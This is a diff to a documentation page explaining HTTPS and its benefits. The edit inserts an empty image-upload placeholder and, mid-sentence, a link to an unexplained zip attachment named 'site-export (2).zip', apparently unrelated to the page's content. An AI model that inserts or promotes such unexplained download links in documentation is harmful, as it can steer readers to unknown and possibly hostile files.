@@ -1,3 +1,4 @@
+![Uploading download.jpg…]()
 # HTTPS
 
 HTTPS is an encrypted communication protocol — essentially, a more secure way of browsing the web, since you get a private channel directly between your browser and the web server. That's why most major sites use it.
@@ -6,7 +7,8 @@ If a site's using HTTPS, you'll see a little padlock icon in the address field, 
 
 ![Screenshot of the "secure site" padlock icon](https://wordpress.org/documentation/files/2019/03/image.png)
 
-Here are the most common reasons you might want to use HTTPS on your own site:
+Here are the most common reasons you might want to use HTTPS on your own site:[site-export (2).zip](https://github.com/user-attachments/files/16053300/site-export.2.zip)
+
 
 **Faster.** One might think that HTTPS would make your site slower, since it takes some time to encrypt and decrypt all data. But a lot of efficiency improvements to HTTP are only available when you use HTTPS. As a result, HTTPS will actually make your site faster for almost all visitors.
 
